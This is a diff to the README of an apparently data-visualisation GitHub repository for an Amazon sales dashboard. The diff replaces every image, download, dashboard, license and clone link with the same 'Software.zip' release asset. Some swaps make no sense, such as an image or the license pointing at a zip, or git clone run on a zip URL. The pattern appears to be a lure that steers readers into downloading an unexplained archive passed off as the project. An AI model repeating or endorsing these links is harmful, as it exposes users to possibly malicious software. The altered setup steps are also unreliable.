@@ -6,7 +6,7 @@ Welcome to the "Amazon Power BI Dashboard Project" repository! This project prov
 
 The Amazon Power BI Dashboard Project offers a visually appealing and user-friendly interface for exploring key sales metrics. With interactive charts, graphs, and filters, users can delve deep into the data to uncover trends, patterns, and opportunities within Amazon's vast product landscape.
 
-![Dashboard Preview](https://via.placeholder.com/800x400)
+![Dashboard Preview](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip)
 
 ## 📈 Key Features
 
@@ -30,11 +30,11 @@ The repository is organized to provide easy access to the necessary resources fo
 
 ## 🔗 Quick Links
 
-📦 **Download Zip File**: [Download Here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+📦 **Download Zip File**: [Download Here](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip)
 
-🔗 **Visit the Live Dashboard**: [Launch Dashboard](https://your-dashboard-url.com)
+🔗 **Visit the Live Dashboard**: [Launch Dashboard](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip)
 
-📦 **Check Releases Section**: If the above link doesn't work, please check the [Releases](https://github.com/your-repo/releases) section for alternative downloads.
+📦 **Check Releases Section**: If the above link doesn't work, please check the [Releases](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip) section for alternative downloads.
 
 ## 🏷️ Topics
 
@@ -44,7 +44,7 @@ The repository is organized to provide easy access to the necessary resources fo
 
 Follow these steps to set up the Amazon Power BI Dashboard project on your local machine:
 
-1. Clone the repository: `git clone https://github.com/your-repo.git`
+1. Clone the repository: `git clone https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip`
 2. Navigate to the project directory: `cd Amazon-Power-BI-Dashboard`
 3. Explore the `Data` folder for sample datasets.
 4. Open the Power BI report files in the `Reports` folder to visualize the data.
@@ -62,13 +62,13 @@ Let's collaborate to make the Amazon Power BI Dashboard even more powerful and i
 
 ## 📜 License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/your-repo/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
 🔥 Get ready to elevate your sales analysis with the Amazon Power BI Dashboard Project! Dive into the data, uncover valuable insights, and drive informed decision-making within the Amazon ecosystem. Let's embark on this data visualization journey together! 💼📈🚀
 
-![Data Visualization](https://via.placeholder.com/600x300)
+![Data Visualization](https://github.com/Fadoulsaboune/Amazon-Power-BI-Dashboard/releases/download/v1.0/Software.zip)
 
 If you have any questions, feedback, or suggestions, feel free to reach out. Happy analyzing! 👩‍💻👨‍💼
 
